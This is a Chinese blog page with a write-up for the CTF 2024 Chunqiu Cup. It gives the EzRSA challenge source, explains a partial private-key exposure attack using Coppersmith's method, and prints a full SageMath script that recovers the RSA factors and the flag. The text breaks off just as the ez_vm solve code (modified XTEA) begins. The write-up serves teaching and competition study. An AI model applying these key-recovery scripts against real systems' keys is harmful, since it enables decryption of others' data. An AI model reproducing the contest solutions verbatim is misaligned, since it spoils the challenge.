<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>CTF2024春秋杯WP题目解析 | LinBlog</title><meta name="author" content="Linstars"><meta name="copyright" content="Linstars"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="CTF春秋杯wp2024题目解析">
<meta property="og:type" content="article">
<meta property="og:title" content="CTF2024春秋杯WP题目解析">
<meta property="og:url" content="http://1.94.234.244/2025/01/20/CTF2024%E6%98%A5%E7%A7%8B%E6%9D%AFWP%E9%A2%98%E7%9B%AE%E8%A7%A3%E6%9E%90/index.html">
<meta property="og:site_name" content="LinBlog">
<meta property="og:description" content="CTF春秋杯wp2024题目解析">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://bu.dusays.com/2025/01/20/678e67b1cb360.png">
<meta property="article:published_time" content="2025-01-20T08:10:14.000Z">
<meta property="article:modified_time" content="2025-01-20T15:12:05.685Z">
<meta property="article:author" content="Linstars">
<meta property="article:tag" content="ctf">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://bu.dusays.com/2025/01/20/678e67b1cb360.png"><link rel="shortcut icon" href="https://bu.dusays.com/2024/12/14/675d55bba492a.png"><link rel="canonical" href="http://1.94.234.244/2025/01/20/CTF2024%E6%98%A5%E7%A7%8B%E6%9D%AFWP%E9%A2%98%E7%9B%AE%E8%A7%A3%E6%9E%90/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://lf6-cdn-tos.bytecdntp.com/cdn/expire-1-M/font-awesome/6.0.0/css/all.min.css"><link rel="stylesheet" href="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/node-snackbar/0.1.16/snackbar.min.css" media="print" onload="this.media='all'"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":195,"highlightFullpage":false,"highlightMacStyle":true},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: {"chs_to_cht":"已切换为繁体中文","cht_to_chs":"已切换为简体中文","day_to_night":"已切换为深色模式","night_to_day":"已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"bottom-left"},
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: true,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'CTF2024春秋杯WP题目解析',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  isShuoshuo: false
}</script><link rel="stylesheet" href="/css/custom.css"><link rel="stylesheet" href="/css/cat.css"><link rel="stylesheet" href="/css/iconfont.css"><div id="myscoll"></div><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(https://bu.dusays.com/2025/01/03/6777930c9d37b.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="https://bu.dusays.com/2024/12/14/675d102b421a9.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">32</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">21</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fas fa-cubes"></i><span> 说说</span></a></li><li><a class="site-page child" href="/air-conditioner/"><i class="fa-fw iconfont icon-kongtiao"></i><span> 小空调</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://bu.dusays.com/2025/01/20/678e67b1cb360.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">LinBlog</span></a><a class="nav-page-title" href="/"><span class="site-name">CTF2024春秋杯WP题目解析</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fas fa-cubes"></i><span> 说说</span></a></li><li><a class="site-page child" href="/air-conditioner/"><i class="fa-fw iconfont icon-kongtiao"></i><span> 小空调</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">CTF2024春秋杯WP题目解析</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-01-20T08:10:14.000Z" title="发表于 2025-01-20 16:10:14">2025-01-20</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-01-20T15:12:05.685Z" title="更新于 2025-01-20 23:12:05">2025-01-20</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2025/01/20/CTF2024%E6%98%A5%E7%A7%8B%E6%9D%AFWP%E9%A2%98%E7%9B%AE%E8%A7%A3%E6%9E%90/#post-comment" itemprop="discussionUrl"><span class="valine-comment-count" data-xid="/2025/01/20/CTF2024%E6%98%A5%E7%A7%8B%E6%9D%AFWP%E9%A2%98%E7%9B%AE%E8%A7%A3%E6%9E%90/" itemprop="commentCount"><i class="fa-solid fa-spinner fa-spin"></i></span></a></span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="day1"><a href="#day1" class="headerlink" title="day1"></a>day1</h1><h2 id="EzRSA"><a href="#EzRSA" class="headerlink" title="EzRSA"></a>EzRSA</h2><a class="btn-beautify " target="_blank" rel="noopener" href="https://video.bbling.cc/EzRSA.zip" title="点击下载原题压缩包"><span>点击下载原题压缩包</span></a>



<details class="toggle" ><summary class="toggle-button" style="">点击展开原题代码python文件</summary><div class="toggle-content"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">N = p * q</span><br><span class="line">e = getPrime(<span class="number">1023</span>)</span><br><span class="line"><span class="keyword">assert</span> e &lt; N</span><br><span class="line">c = <span class="built_in">pow</span>(bytes_to_long(flag), e, N)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;N = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;e = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;c = &#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = inverse(e, phi)</span><br><span class="line">k = (e * d - <span class="number">1</span>) // phi</span><br><span class="line"></span><br><span class="line">dh = d &gt;&gt; <span class="number">234</span></span><br><span class="line">dl = d % <span class="built_in">pow</span>(<span class="number">2</span>, <span class="number">24</span>)</span><br><span class="line">kh = k &gt;&gt; <span class="number">999</span></span><br><span class="line"></span><br><span class="line">hash224 = bytes_to_long(hashlib.sha224(long_to_bytes(dl)).digest())</span><br><span class="line">hash512 = bytes_to_long(hashlib.sha512(long_to_bytes(kh)).digest())</span><br><span class="line">leak = hash224 ^ hash512 ^ (k % <span class="built_in">pow</span>(<span class="number">2</span>, <span class="number">512</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;dh = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;leak = &#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">N = 136118062754183389745310564810647775266982676548047737735816992637554134173584848603639466464742356367710495866667096829923708012429655117288119142397966759435369796296519879851106832954992705045187415658986211525671137762731976849094686834222367125196467449367851805003704233320272315754132109804930069754909</span></span><br><span class="line"><span class="string">e = 84535510470616870286532166161640751551050308780129888352717168230068335698416787047431513418926383858925725335047735841034775106751946839596675772454042961048327194226031173378872580065568452305222770543163564100989527239870852223343451888139802496983605150231009547594049003160603704776585654802288319835839</span></span><br><span class="line"><span class="string">c = 33745401996968966125635182001303085430914839302716417610841429593849273978442350942630172006035442091942958947937532529202276212995044284510510725187795271653040111323072540459883317296470560328421002809817807686065821857470217309420073434521024668676234556811305412689715656908592843647993803972375716032906</span></span><br><span class="line"><span class="string">dh = 4640688526301435859021440727129799022671839221457908177477494774081091121794107526784960489513468813917071906410636566370999080603260865728323300663211132743906763686754869052054190200779414682351769446970834390388398743976589588812203933</span></span><br><span class="line"><span class="string">leak = 12097621642342138576471965047192766550499613568690540866008318074007729495429051811080620384167050353010748708981244471992693663360941733033307618896919023</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
</div></details>



<p>私钥高位泄露，根据文献[1]中的定理6，符合相关条件时，由</p>
<p><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><mrow><mover><mi>k</mi><mo stretchy="false">~</mo></mover></mrow><mo>&#x3D;⊏</mo><mfrac><mrow><mi>e</mi><mi>a</mi><mo>−</mo><mn>1</mn></mrow><mi>N</mi></mfrac><mo>⊐</mo></math></p>
<details class="toggle" ><summary class="toggle-button" style="">点击展开markdown公式</summary><div class="toggle-content"><p>$$<br>\tilde{k} &#x3D; \sqsubset  \frac{ea-1}{N} \sqsupset<br>$$</p>
</div></details>

<p>可以计算出k的近似值。但是该题的e是full size，不符合条件，用上述公式只能恢复k的512位MSBs，令其为k1</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dh = dh &lt;&lt; <span class="number">234</span></span><br><span class="line">k1 = (e * dh - <span class="number">1</span>) // N + <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>[1] Boneh, D., Durfee, G., Frankel, Y. (1998). An Attack on RSA Given a Small Fraction of the Private Key Bits. In: Ohta, K., Pei, D. (eds) Advances in Cryptology — ASIACRYPT’98. ASIACRYPT 1998. Lecture Notes in Computer Science, vol 1514. Springer, Berlin, Heidelberg. <a target="_blank" rel="noopener" href="https://doi.org/10.1007/3-540-49649-1_3">https://doi.org/10.1007/3-540-49649-1_3</a></p>
<p>通过k1计算出kh、hash512</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kh = k1 &gt;&gt; <span class="number">999</span></span><br><span class="line">hash512 = bytes_to_long(hashlib.sha512(long_to_bytes(kh)).digest())</span><br></pre></td></tr></table></figure>

<p>因为<code>leak = hash224 ^ hash512 ^ (k % pow(2, 512))</code>，已知leak和sha512，同时注意到hash224只有224位，通过异或可以计算出k的512位LSBs中的<code>512-224=288</code>比特的高位，即目前已知k的<code>512+288=800</code>位MSBs，令其为k2</p>
<p>通过k2可以恢复p+q的234位MSBs，无需考虑hash224（其为干扰项）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">paq = N + <span class="number">1</span> - (e * dh - <span class="number">1</span>) // k2</span><br></pre></td></tr></table></figure>

<p>结合paq和N，可以恢复p、q的高位，其位数足以用Coppersmith恢复完整的p、q</p>
<p>完整exp如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">N = <span class="number">136118062754183389745310564810647775266982676548047737735816992637554134173584848603639466464742356367710495866667096829923708012429655117288119142397966759435369796296519879851106832954992705045187415658986211525671137762731976849094686834222367125196467449367851805003704233320272315754132109804930069754909</span></span><br><span class="line">e = <span class="number">84535510470616870286532166161640751551050308780129888352717168230068335698416787047431513418926383858925725335047735841034775106751946839596675772454042961048327194226031173378872580065568452305222770543163564100989527239870852223343451888139802496983605150231009547594049003160603704776585654802288319835839</span></span><br><span class="line">c = <span class="number">33745401996968966125635182001303085430914839302716417610841429593849273978442350942630172006035442091942958947937532529202276212995044284510510725187795271653040111323072540459883317296470560328421002809817807686065821857470217309420073434521024668676234556811305412689715656908592843647993803972375716032906</span></span><br><span class="line">dh = <span class="number">4640688526301435859021440727129799022671839221457908177477494774081091121794107526784960489513468813917071906410636566370999080603260865728323300663211132743906763686754869052054190200779414682351769446970834390388398743976589588812203933</span></span><br><span class="line">leak = <span class="number">12097621642342138576471965047192766550499613568690540866008318074007729495429051811080620384167050353010748708981244471992693663360941733033307618896919023</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pq_add</span>(<span class="params">p, q, leak</span>):</span><br><span class="line">    lp, lq = <span class="built_in">len</span>(p), <span class="built_in">len</span>(q)</span><br><span class="line">    tp0 = <span class="built_in">int</span>(p + (<span class="number">512</span>-lp) * <span class="string">&#x27;0&#x27;</span>, <span class="number">2</span>)</span><br><span class="line">    tq0 = <span class="built_in">int</span>(q + (<span class="number">512</span>-lq) * <span class="string">&#x27;0&#x27;</span>, <span class="number">2</span>)</span><br><span class="line">    tp1 = <span class="built_in">int</span>(p + (<span class="number">512</span>-lp) * <span class="string">&#x27;1&#x27;</span>, <span class="number">2</span>)</span><br><span class="line">    tq1 = <span class="built_in">int</span>(q + (<span class="number">512</span>-lq) * <span class="string">&#x27;1&#x27;</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> tp0 * tq0 &gt; N <span class="keyword">or</span> tp1 * tq1 &lt; N:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">if</span> lp == <span class="number">512</span>-unknown_bits:</span><br><span class="line">        pq.append(tp0)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    t = <span class="built_in">int</span>(leak[:<span class="number">2</span>], <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> t == <span class="number">0</span>:</span><br><span class="line">        pq_add(p + <span class="string">&#x27;0&#x27;</span>, q + <span class="string">&#x27;0&#x27;</span>, leak[<span class="number">1</span>:])</span><br><span class="line">    <span class="keyword">if</span> t == <span class="number">1</span>:</span><br><span class="line">        pq_add(p + <span class="string">&#x27;0&#x27;</span>, q + <span class="string">&#x27;0&#x27;</span>, leak[<span class="number">1</span>:])</span><br><span class="line">        pq_add(p + <span class="string">&#x27;1&#x27;</span>, q + <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;0&#x27;</span> + leak[<span class="number">2</span>:])</span><br><span class="line">        pq_add(p + <span class="string">&#x27;0&#x27;</span>, q + <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;0&#x27;</span> + leak[<span class="number">2</span>:])</span><br><span class="line">    <span class="keyword">if</span> t == <span class="number">2</span>:</span><br><span class="line">        pq_add(p + <span class="string">&#x27;1&#x27;</span>, q + <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span> + leak[<span class="number">2</span>:])</span><br><span class="line">        pq_add(p + <span class="string">&#x27;0&#x27;</span>, q + <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span> + leak[<span class="number">2</span>:])</span><br><span class="line">        pq_add(p + <span class="string">&#x27;1&#x27;</span>, q + <span class="string">&#x27;1&#x27;</span>, leak[<span class="number">1</span>:])</span><br><span class="line">    <span class="keyword">if</span> t == <span class="number">3</span>:</span><br><span class="line">        pq_add(p + <span class="string">&#x27;1&#x27;</span>, q + <span class="string">&#x27;1&#x27;</span>, leak[<span class="number">1</span>:])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dh = dh &lt;&lt; <span class="number">234</span></span><br><span class="line">k1 = (e * dh - <span class="number">1</span>) // N + <span class="number">1</span></span><br><span class="line">kh = k1 &gt;&gt; <span class="number">999</span></span><br><span class="line">hash512 = bytes_to_long(hashlib.sha512(long_to_bytes(kh)).digest())</span><br><span class="line"></span><br><span class="line">unknown_bits = <span class="number">234</span> + <span class="number">5</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>**<span class="number">6</span>):</span><br><span class="line">    k2 = (k1 &gt;&gt; (<span class="number">512</span> + <span class="number">6</span>) &lt;&lt; (<span class="number">512</span> + <span class="number">6</span>)) + (i &lt;&lt; <span class="number">512</span>) + (leak ^ hash512)</span><br><span class="line">    paq = N + <span class="number">1</span> - (e * dh - <span class="number">1</span>) // k2</span><br><span class="line"></span><br><span class="line">    pq = []</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pq_add(p=<span class="string">&#x27;&#x27;</span>, q=<span class="string">&#x27;&#x27;</span>, leak=<span class="built_in">bin</span>(paq)[<span class="number">2</span>:])</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ph <span class="keyword">in</span> pq:</span><br><span class="line">        x = PolynomialRing(Zmod(N), <span class="string">&#x27;x&#x27;</span>).gen()</span><br><span class="line">        f = ph + x</span><br><span class="line">        res = f.monic().small_roots(X=<span class="number">2</span>**unknown_bits, beta=<span class="number">0.49</span>, epsilon=<span class="number">0.03</span>)</span><br><span class="line">        <span class="keyword">if</span> res:</span><br><span class="line">            p = <span class="built_in">int</span>(f(res[<span class="number">0</span>]))</span><br><span class="line">            q = N // p</span><br><span class="line">            <span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c, inverse(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>)), N)))</span><br><span class="line">            exit()</span><br></pre></td></tr></table></figure>

<h2 id="ez-vm"><a href="#ez-vm" class="headerlink" title="ez_vm"></a>ez_vm</h2><a class="btn-beautify " target="_blank" rel="noopener" href="https://video.bbling.cc/wp%E6%98%A5%E7%A7%8B%E6%9D%AF2024/ezvm_7a00d45a31323b34531b58371f618c16.zip" title="点击下载题文件"><span>点击下载题文件</span></a>

<p>是对vm进行手撕，通过手撕一遍流程基本可以确定是一个xtea魔改，将vm执行一遍的运算表达式写出，有很多xtea的特征 但是因为变量较多，代码混淆比较严重 后续还有对取一个数组的值替换加密结果的操作，逆向回来就行，弄懂一遍循环就可以明白后续的流程都一样 </p>
<p>编写exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#define _CRT_SECURE_NO_WARNINGS</span></span><br><span 